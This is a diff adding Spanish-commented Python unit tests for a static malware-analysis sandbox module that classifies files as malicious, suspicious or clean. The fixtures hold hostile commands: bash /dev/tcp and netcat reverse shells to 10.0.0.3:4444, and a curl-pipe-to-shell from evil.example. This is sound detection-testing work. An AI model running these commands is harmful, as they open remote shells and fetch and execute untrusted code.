@@ -1568,5 +1568,80 @@ class IdentityActuatorTests(unittest.TestCase):
         self.assertTrue(any("usermod -L intruso" in c for c in self._flat()))
 
 
+class SandboxTests(unittest.TestCase):
+    """F6 (Core) — sandbox ESTÁTICO: veredicto sin ejecutar nada."""
+
+    def setUp(self):
+        self.d = _isolate()
+        from arx.modules import sandbox
+        self.s = sandbox
+
+    def _file(self, data, name="sample"):
+        path = os.path.join(self.d, name)
+        mode = "wb" if isinstance(data, bytes) else "w"
+        with open(path, mode) as f:
+            f.write(data)
+        return path
+
+    def test_rules_integrity(self):
+        self.assertEqual(self.s.validate(), [])
+
+    def test_eicar_signature_is_malicious(self):
+        # solo la FIRMA, no el EICAR funcional: el fixture no es un EICAR detectable por AV
+        rep = self.s.analyze(self._file("x EICAR-STANDARD-ANTIVIRUS-TEST-FILE y\n"))
+        self.assertEqual(rep["verdict"], "malicioso")
+        self.assertIn("eicar-test", [h["rule"] for h in rep["hits"]])
+
+    def test_reverse_shell_script_is_malicious(self):
+        rep = self.s.analyze(self._file("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.3/4444 0>&1\n"))
+        self.assertEqual(rep["verdict"], "malicioso")
+        self.assertEqual(rep["type"], "script")
+        self.assertIn("revshell-devtcp", [h["rule"] for h in rep["hits"]])
+
+    def test_download_pipe_shell_is_suspicious(self):
+        rep = self.s.analyze(self._file("#!/bin/sh\ncurl -s http://evil.example/x | sh\n"))
+        self.assertEqual(rep["verdict"], "sospechoso")
+
+    def test_clean_text_is_clean(self):
+        rep = self.s.analyze(self._file("#!/bin/sh\necho hola\nls -la /var/log\n"))
+        self.assertEqual(rep["verdict"], "limpio")
+        self.assertEqual(rep["hits"], [])
+
+    def test_filetype_and_entropy(self):
+        self.assertEqual(self.s.file_type(b"\x7fELF----"), "elf")
+        self.assertEqual(self.s.file_type(b"MZ......"), "pe")
+        self.assertEqual(self.s.file_type(b"#!/bin/sh\n"), "script")
+        self.assertEqual(self.s.shannon_entropy(b"\x00" * 100), 0.0)     # un solo símbolo
+        self.assertGreater(self.s.shannon_entropy(bytes(range(256))), 7.9)  # uniforme
+
+    def test_high_entropy_executable_is_suspicious(self):
+        rep = self.s.analyze(self._file(b"\x7fELF" + os.urandom(16384), "packed"))
+        self.assertEqual(rep["type"], "elf")
+        self.assertGreater(rep["entropy"], 7.2)
+        self.assertEqual(rep["verdict"], "sospechoso")
+        self.assertIn("high-entropy-exec", [h["rule"] for h in rep["hits"]])
+
+    def test_unreadable_file_is_honest(self):
+        rep = self.s.analyze(os.path.join(self.d, "no-existe"))
+        self.assertFalse(rep["ok"])
+        self.assertEqual(rep["verdict"], "desconocido")
+
+    def test_enrich_finding_tags_malicious_executable(self):
+        path = self._file("#!/bin/bash\nnc -e /bin/sh 10.0.0.3 4444\n", "dropper")
+        finding = {"kind": "executables", "sev": "med", "detail": "ejecutable nuevo",
+                   "why": "no en la base", "target": {"exe": path}}
+        out = self.s.enrich_finding(finding)
+        self.assertEqual(out["sev"], "high")          # un malicioso prioriza
+        self.assertIn("sandbox:", out["detail"])
+        self.assertEqual(out["sandbox"]["verdict"], "malicioso")
+
+    def test_enrich_leaves_clean_and_non_exe_untouched(self):
+        clean = {"kind": "executables", "sev": "low", "detail": "d",
+                 "target": {"exe": self._file("#!/bin/sh\necho ok\n", "clean")}}
+        self.assertIs(self.s.enrich_finding(clean), clean)     # limpio → sin ruido
+        other = {"kind": "port_scan", "sev": "high", "target": {"ip": "1.2.3.4"}}
+        self.assertIs(self.s.enrich_finding(other), other)     # no es ejecutable
+
+
 if __name__ == "__main__":
     unittest.main()
